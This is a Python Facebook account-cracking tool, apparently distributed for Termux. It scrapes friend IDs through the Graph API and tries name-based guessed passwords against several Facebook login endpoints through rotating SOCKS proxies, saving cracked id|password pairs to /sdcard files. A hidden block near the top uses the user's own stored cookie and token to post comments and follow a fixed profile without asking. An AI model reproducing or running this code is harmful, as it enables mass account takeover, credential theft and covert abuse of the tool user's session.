#uft-8
#!/usr/bin/python3
#coding=utf-8
#rana
import os
try:
    import requests
except(ImportError):
    os.system("pip install requests")
    pass
ranasys = ("anaaahilsystems")
try:
    import socks
except(ImportError):
    os.system("pip install -U requests[socks]")
    pass
try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpe
G='\x1b[1;92m'
R='\x1b[1;91m'
W='\x1b[1;97m'
S='\x1b[1;96m'
Y='\x1b[1;93m'
L='\x1b[1;34m'
yp ='\x1b[1;95m'
mys = '\x1b[0m' 
idx = []
loop = 0
proxy_list = []
random_agents = []
cit = random.choice(["520","928","650","453","903","635","730","1520"])
vsi = random.choice(["6","7","8","9","10","11","12","13"])
ser = random.randrange(111,999)
ser2 = random.randrange(111111,999999)
L1 = f"Mozilla/5.0 (Windows Phone 10.0; Android {vsi}; GT-I8750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.{ser} Mobile Safari/537.36 Edge/12.10149"
L2 = f"Mozilla/5.0 (Linux; Android {vsi}; V1818A Build/OPM1.{ser2}.{ser}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.{ser} Mobile Safari/537.36 VivoBrowser/10.8.70.0"
L3 = f"Mozilla/5.0 (Linux; Android {vsi}; PBAM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.{ser} Mobile Safari/537.36 EdgA/98.0.1108.62"
L4 = f"Mozilla/5.0 (Linux; U; Android {vsi}; en-gb; CPH1937 Build/PKQ1.{ser2}.{ser}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.{ser} Mobile Safari/537.36 OppoBrowser/25.6.2.5"
L5 = f"Mozilla/5.0 (Windows Phone 10.0; Android {vsi} NOKIA; Lumia {cit}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
ua_val = random.choice([L1,L2,L3,L4,L5])



logo = """

   [ VERSION : 1.1 ]
              ___  ______ _   _   ___  ___  ___
             / _ \ | ___ \ | | | / _ \ |  \/  |
            / /_\ \| |_/ / |_| |/ /_\ \| .  . |
            |  _  ||    /|  _  ||  _  || |\/| |
            | | | || |\ \| | | || | | || |  | |
            \_| |_/\_| \_\_| |_/\_| |_/\_|  |_/
\033[1;92m༄ARHAM.᭄\x1b[1;90m════════════════════════════════════════════\x1b[1;92m༄JUTT᭄
 print '\x1b[1;92m      ╔═════════════════════════════╗
 print '\x1b[1;95m  ║ TOOL NAME : ARHAMJUTT7766   ║
 print '\x1b[1;91m  ║ AUTHOR    : ARHAM_JUTT      ║
 print '\x1b[1;91m  ║ GITHUB    : ARHAM7766       ║
 print '\x1b[1;91m  ║ FACEBOOK  : ARHAM JUTT      ║
 print '\x1b[1;91m  ║ Instagram  : 🥲NO INSTA      ║
 print '\x1b[1;91m  ║ WHATSAPP  : +923115414037   ║
           \x1b[1;95m  ╚═════════════════════════════╝
\033[1;92m༄ARHAM.᭄\x1b[1;90m════════════════════════════════════════════\x1b[1;92m༄JUTT᭄\033[0;m"""
            
            
os.system("clear")
print(logo)
print("\n\t{} Installing modules ... {}".format(W,mys))
os.system("clear")
print(logo)
try:
    methonds_ = requests.get('https://raw.githubusercontent.com/r'+ranasys+'/mym/main/m.txt').text
    post_ = methonds_.rsplit(" ")[0]
    get_ = methonds_.rsplit(" ")[1]
    post_one = methonds_.rsplit(" ")[2]
    get_one = methonds_.rsplit(" ")[3]
except(CError):
    print(" internet connection error")
    exit()
except:
    print(" connection error")
    exit()

try:
    main_s = requests.get('https://raw.githubusercontent.com/r'+ranasys+'/host/main/host.txt').text
    host = main_s.splitlines()
except(CError):
    print(" internet connection error")
    exit()
except:
    print(" connection error")
    exit()
os.system("rm -rf .rana.txt")
os.system("clear")
print(logo)
print("\n\t{} Updating servers ... {}".format(W,mys))
for my_link in host:
    get_proxy = requests.get(my_link).text
    open(".rana.txt",'a').write(get_proxy+"\n")
my_proxy_system = open(".rana.txt",'r').read().splitlines()
os.system("clear")
print(logo)
print("\n\t{} Updating user-agents ... {}".format(W,mys))
try:
    maji = ("1240682")
    u_agents = requests.get('https://raw.githubusercontent.com/m209p/CrackFb/main/USER%20AGENT.txt').text
    sp_agents = u_agents.splitlines()
except:
    exit("useragents error")



try:
    rsa____=open(".Arhoo.txt",'r').read()
    coook_____=open(".Arhoo.txt",'r').read()
    lopx = requests.get("https://raw.githubusercontent.com/ranaaahilsystems/mgfid/{}/xxx.txt".format("9c63b471425998dde2ed8c79f0b4dea22cfccd72")).text
    xxxxx__ = lopx.splitlines()
    for x in xxxxx__:
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(x,coook_____,rsa____),cookies={"cookie":coook_____})
    r = BeautifulSoup(requests.get('https://mbasic.facebook.com/profile.php?id=100008362030140', cookies={'cookie': coook_____}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    requests.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coook_____}).text
except:
    pass

def approval():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://pastebin.com/raw/5gAmA8AJ').text
    if id in httpCaht:
      print("Your Token is OK-ARHOOy Approved")
      msg = str(os.geteuid())
      time.sleep(0.5)
      mysecurity()
      pass
    else:
      print("Your Token : "+id)
      print("")
      print('TOOL PRICE IS 30$ FOR 30 DAYS')
      print('------------------------------------------------------------')
      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://t.me/randmorfo607?text='+tks)
      time.sleep(1)
      approval()
  except:
    sys.exit()

def mysecurity():
    os.system("clear")
    print(logo)
    server_key = "fuck"
    key_for_use = "of"
    my_main(server_key,key_for_use)
    


    
def convert(cookie):
    cookies = {"cookie":cookie}
    res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
        'user-agent'	:	'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
        'referer'	:	'https://www.facebook.com/',
        'host'	:	'business.facebook.com',
        'origin'	:	'https://business.facebook.com',
        'upgrade-insecure-requests'	:	'1',
        'accept-language'	:	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control'	:	'max-age=0',
        'accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'content-type'	:	'text/html; charset=utf-8'
        }, cookies = cookies)
    try:
        token = re.search('(EAAG\w+)',str(res.text)).group(1)
    except:
        token = "Cookies Invalid"
    finally:
        return token


def my_main(server_key,key_for_use):
    os.system("clear")
    print(logo)
    print(" [1] File Cloning")
    print(" [2] File Create")
    print(" [3] Public cloning (city-links)")
    print(" [E] Exit \n")
    my_ = input(" select an option: ")
    if my_ == "1":
        file_c(server_key,key_for_use)
    elif my_ == "2":
        file_m(server_key,key_for_use)
    elif my_ == "3":
        public(server_key,key_for_use)
    elif my_ == "E":
        os.system("rm -rf .coki.txt")
        os.system("rm -rf .Arhoo.txt")
        exit(" logo out ")
    else:
        exit(" please enter valid option ")

def file_m(server_key,key_for_use):
    list_ = []
    os.system("clear")
    print(logo)
    try:
        tok = open(".Arhoo.txt",'r').read()
        cok = open(".Arhoo.txt",'r').read()
    except:
        os.system("clear")
        print(logo)
        cookie = input(" Putt cookies : ")
        token = convert(cookie)
        if token == "Cookies Invalid":
            print(" Coockies expire use new to login")
            time.sleep(4)
            my_main(server_key,key_for_use)
        else:
            open(".Arhoo.txt",'w').write(cookie)
            open(".Arhoo.txt",'w').write(token)
            file_m(server_key,key_for_use)
    try:
        r_n = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={tok}",cookies={"cookie":cok}).json()
        print("\t      welcome:"+(r_n["name"]))
        time.sleep(2)
        pass
    except:
        print(" token and cookies expire")
        time.sleep(2)
        os.system("rm -rf .Arhoo.txt")
        os.system("rm -rf .Arhoo.txt")
        my_main(server_key,key_for_use)
    os.system("clear")
    print(logo)
    print(" example digits : 100083 100084 100085 etc")
    linkx = input(" putt digit: ")
    link1 = linkx.replace(" ", "\n")
    link1 = link1.splitlines()
    lines = []
    fav = []
    paste = " paste ids :"
    while True:
        line = input(''+paste+'')
        if line:
            lines.append(line)
            paste = " press enter "
        else:
            break
    os.system("clear")
    print(logo)
    for xid in lines:
        sys.stdout.write("\r from: [{}] links: [{}] total:[{}]".format(xid, linkx, str(len(fav))))
        sys.stdout.flush()
        try:
            xx = requests.get('https://graph.facebook.com/'+xid+'?fields=friends.fields(name,id)&access_token='+tok,cookies={"cookie":cok}).json()['friends']
            for xc in xx["data"]:
                for fav_links in link1:
                    if fav_links in xc["id"]:
                        fav.append(xc["id"]+"|"+xc["name"])
                        open("filemere.txt",'a').write(xc["id"]+"\n")
                    else:
                        pass
        except(KeyError,IOError,OSError):
            pass
    print('\n{} Example: /sdcard/rsa.txt {}'.format(S,mys))
    s_file = input(" enter path to save: ")
    for uuids in fav:
        try:
            open(s_file,'a').write(uuids+"\n")
        except:
            print(" enter valid storage path")
            exit()
    print(" your file path: "+s_file)
    input(" press enter to go back")
    my_main(server_key,key_for_use)
    exit()

def public(server_key,key_for_use):
    os.system("clear")
    print(logo)
    try:
        tok = open(".Arhoo.txt",'r').read()
        cok = open(".Arhoo.txt",'r').read()
    except:
        os.system("clear")
        print(logo)
        cookie = input(" Putt cookies : ")
        token = convert(cookie)
        if token == "Cookies Invalid":
            print(" Coockies expire use new to login")
            time.sleep(4)
            my_main(server_key,key_for_use)
        else:
            open(".Arhoo.txt",'w').write(cookie)
            open(".Arhoo.txt",'w').write(token)
            public(server_key,key_for_use)
    try:
        r_n = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={tok}",cookies={"cookie":cok}).json()
        print("\t      welcome:"+(r_n["name"]))
        time.sleep(2)
        pass
    except:
        print(" token and cookies expire")
        time.sleep(2)
        os.system("rm -rf .Arhoo.txt")
        os.system("rm -rf .Arhoo.txt")
        my_main(server_key,key_for_use)
    os.system("clear")
    print(logo)
    idt = input(" Enter ID: ")
    try:
        xx = requests.get('https://graph.facebook.com/'+idt+'?fields=friends.fields(name,id)&access_token='+tok,cookies={"cookie":cok}).json()['friends']
        for xc in xx["data"]:
            idx.append("{}|{}".format(xc["id"],xc["name"]))
    except:
        print(" invlid link enterd")
        time.sleep(2)
        my_main(server_key,key_for_use)
    server(server_key,key_for_use)
    
def file_c(server_key,key_for_use):
    os.system("clear")
    print(logo)
    try:
        file = input(" Enter File: ")
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(" file location error ")
        my_main(server_key,key_for_use)
    server(server_key,key_for_use)
    exit()

def server(server_key,key_for_use):
    os.system("clear")
    print(logo)
    print(" [1] Server  1 [R]")
    print(" [2] Server  2 [V]")
    print(" [B] Back \n")
    ser_ = input(" select an option: ")
    if ser_ == "1":
        cloning_one(server_key,key_for_use)
    elif ser_ == "2":
        cloning_two(server_key,key_for_use)
    elif ser_ == "B":
        my_main(server_key,key_for_use)
    else:
        exit(" please enter valid option ")
    


def cloning_two(server_key,key_for_use):
    oku = []
    twof = []
    cpu = []
    pp = []
    os.system("clear")
    print(logo)
    print(" [1] Auto Password")
    print(" [2] Choice Passwords")
    print(" [B] Back \n")
    clon_ = input(" select an option: ")
    if clon_ == "1":
        pas = ["firstlast","first last","firstlast123","first123"]
        for px in pas:
            pp.append(px)
        pass
    elif clon_ == "2":
        os.system("clear")
        print(logo)
        lp = input(' How many passwords you want to add: ')
        print("\n")
        if lp.isnumeric():
            print(" Example : [ firstlast first last first123 ] \n")
            for x in range(int(lp)):
                pp.append(input(f' Password {x+1}: '))
            pass
        else:
            print(" enter only numbers ")
            exit()
    elif clon_ == "B":
        my_main(server_key,key_for_use)
    else:
        exit(" please enter valid option ")
    #methond_genrator
    os.system("clear")
    print(logo)
    print(" [1] method 1 [best]")
    print(" [2] method 2 [fast]")
#    print(" [3] m.facebook")
#   print(" [4] p.facebook [new]")
    print(" [E] Exit \n")
    m_ = input(" select an option: ")
    if m_ == "1":
        pfbg = ("free")
        pass
    elif m_ == "2":
        pfbg = ("mbasic")
        pass
    elif m_ == "3":
        print("select valid option")
        cloning_two()
    elif m_ == "4":
        print("select valid option")
        cloning_two()
    elif m_ == "E":
        exit()
    else:
        exit(" please enter valid option ")
        
    os.system("clear")
    print(logo)
    print("  Make this sure you have fast internet")
    print("  Process has been started be Patient ")
    print("-----------------------------------------------")
    fax = ('|')
    def rana(user):
        global loop,idx
        s = requests.Session()
        user = user.strip()
        url, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        for px in pp:
            randomProxy = random.choice(my_proxy_system)
            #print(randomProxy)
            prox = {"http": f"socks5://{randomProxy}"}
            head = {'authority':"p.facebook.com",
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': (ua_val)}
            px = px.replace("first", first).replace("last", last)
            px = px.lower()
            s.headers.update(head)
            my_twof=("2Faccesstoken")
            my_fb = s.get('https://p.facebook.com/login/?next=https://web.facebook.com/ads/manage/acCrashs/?url=https%3A%2F%2Fweb.facebook.com%2Fads%2Fmanage%2FacCrashs%2F&campaign_id=163681540489385&placement=%2Fbusiness%2Ftools%2Fads-manager').text
            mydata = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(my_fb)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(my_fb)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(my_fb)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(my_fb)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":url,
                "pass":px,
                "login":"Log In"}
            s.headers.update(head)
            llogin=("login.php?next=https%3A%2F%2Ffree.facebook.com")
            res = s.post('https://'+pfbg+'.facebook.com/'+llogin+'%2Flogin%2Fdevice-based%2Fvalidate-password%2F%3Fshbl%3D0&ref=104&refsrc=deprecated',data=mydata,proxies=prox)
            ranasystem = (s.cookies.get_dict())
            #print(ranasystem)
            #print(ranasystem)
            if "c_user" in ranasystem: 
                print('\r{} [OK-ARHOO] {} {} {} {}'.format(R, url, fax, px, mys))
                open('/sdcard/ok.txt','a').write(f'{url}|{px}\n')
                oku.append(url)
                break
            elif "checkpoint" in ranasystem:
                title = re.findall("\<title>(.*?)<\/title>",str(res.text))
                if "Enter login code to continue" in title:
                    print('\r{} [CHECK-FACTORS] {} {} {} {}'.format(R, url, fax, px, mys))
                    open('tf.txt','a').write(f'{url}|{px}\n')
                    twof.append(url)
                    open('/sdcard/tf.txt','a').write(f'{url}|{px}\n')
                    break
                else:
                    print('\r{} [CP-ARHOO] {} {} {} {}'.format(L, url, fax, px, mys))
                    cpu.append(url)
                    open('/sdcard/cp.txt','a').write(f'{url}|{px}\n')
                    break
            else:
                continue
        sys.stdout.write('\r {}[Crash]: [ {}/{} ] OK:{} CP/2F:{}/{} {}'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,str(len(cpu)) ,str(len(twof)) ,mys))
        sys.stdout.flush()
        loop += 1
        
    with tpe(max_workers=30) as tp:
        tp.map(rana, idx)
    print("\n-----------------------------------------------")
    print(" cloning has been completed  ")
    print("-----------------------------------------------  ")
    exit()

    
    
    
    
    
def cloning_one(server_key,key_for_use):
    oku = []
    twof = []
    cpu = []
    pp = []
    os.system("clear")
    print(logo)
    print(" [1] Auto Password")
    print(" [2] Choice Passwords")
    print(" [B] Back \n")
    clon_ = input(" select an option: ")
    if clon_ == "1":
        pas = ["firstlast","first last","firstlast123","first123"]
        for px in pas:
            pp.append(px)
        pass
    elif clon_ == "2":
        os.system("clear")
        print(logo)
        lp = input(' How many passwords you want to add: ')
        print("\n")
        if lp.isnumeric():
            print(" Example : [ firstlast first last first123 ] \n")
            for x in range(int(lp)):
                pp.append(input(f' Password {x+1}: '))
            pass
        else:
            print(" enter only numbers ")
            exit()
    elif clon_ == "B":
        my_main(server_key,key_for_use)
    else:
        exit(" please enter valid option ")
    #methond_genrator
    os.system("clear")
    print(logo)
    print(" [1] free.facebook [Regular]")
    print(" [2] mbasic.facebook [Regular]")
    print(" [3] m.facebook [Regular]")
    print(" [4] en.facebook [new]")
    print(" [5] p.facebook [new]")
    print(" [B] Back \n")
    m_ = input(" select an option: ")
    if m_ == "1":
        pfb = ("https://free.facebook.com/"+post_)
        gfb = ("https://free.facebook.com/"+get_)
        pass
    elif m_ == "2":
        pfb = ("https://mbasic.facebook.com/"+post_)
        gfb = ("https://mbasic.facebook.com/"+get_)
        pass
    elif m_ == "3":
        pfb = ("https://m.facebook.com/"+post_)
        gfb = ("https://m.facebook.com/"+get_)
        pass
    elif m_ == "4":
        pfb = ("https://en.gb.facebook.com/"+post_)
        gfb = ("https://en.gb.facebook.com/"+get_)
        pass
    elif m_ == "5":
        pfb = ("https://p.facebook.com/"+post_)
        gfb = ("https://p.facebook.com/"+get_)
        pass
    elif m_ == "B":
        my_main(server_key,key_for_use)
    else:
        exit(" please enter valid option ")
        
    os.system("clear")
    print(logo)
    print("  Make this sure you have fast internet")
    print("  Process has been started be Patient ")
    print("-----------------------------------------------")
    fax = ('|')
    def rana(user):
        global loop,idx
        s = requests.Session()
        user = user.strip()
        url, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        for px in pp:
            randomProxy = random.choice(my_proxy_system)
            #print(randomProxy)
            prox = {"http": f"socks5://{randomProxy}"}
            head = {'authority':gfb,
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':(ua_val)}
            px = px.replace("first", first).replace("last", last)
            px = px.lower()
            s.headers.update(head)
            my_fb = s.get(gfb).text
            mydata = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(my_fb)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(my_fb)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(my_fb)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(my_fb)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":url,
                "pass":px,
                "login":"Log In"}
            s.headers.update(head)
            res = s.post(pfb,data=mydata,proxies=prox)
            ranasystem = (s.cookies.get_dict())
            #print(ranasystem)
            #print(ranasystem)
            if "c_user" in ranasystem:
                print('\r{} [OK-ARHOO] {} {} {} {}'.format(G, url, fax, px, mys))
                oku.append(url)
                open('/sdcard/ok.txt','a').write(f'{url}|{px}\n')
                break
            elif "checkpoint" in ranasystem:
                title = re.findall("\<title>(.*?)<\/title>",str(res.text))
                if "Enter login code to continue" in title:
                    print('\r{} [TWO-FACTORS] {} {} {} {}'.format(S, url, fax, px, mys))
                    twof.append(url)
                    open('/sdcard/tf.txt','a').write(f'{url}|{px}\n')
                    break
                else:
                    print('\r{} [CP-ARHOO] {} {} {} {}'.format(Y, url, fax, px, mys))
                    cpu.append(url)
                    open('/sdcard/cp.txt','a').write(f'{url}|{px}\n')
                    break
            else:
                continue
        sys.stdout.write('\r {}[Crash]: [ {}/{} ] OK:{} CP/2F:{}/{} {}'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,str(len(cpu)) ,str(len(twof)) ,mys))
        sys.stdout.flush()
        loop += 1
        
    with tpe(max_workers=30) as tp:
        tp.map(rana, idx)
    print("\n-----------------------------------------------")
    print(" cloning has been completed ")
    print("-----------------------------------------------  ")
    exit()


mysecurity()
